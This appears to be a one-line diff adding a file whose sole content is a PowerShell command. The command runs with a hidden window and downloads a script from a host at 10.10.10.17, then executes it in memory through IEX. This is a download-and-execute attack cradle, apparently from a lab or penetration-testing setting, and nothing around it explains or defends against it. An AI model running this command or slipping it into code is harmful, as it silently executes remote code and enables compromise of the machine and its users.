@@ -1,0 +1,1 @@
+powershell -w hidden "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.17/mytest.ps1');"
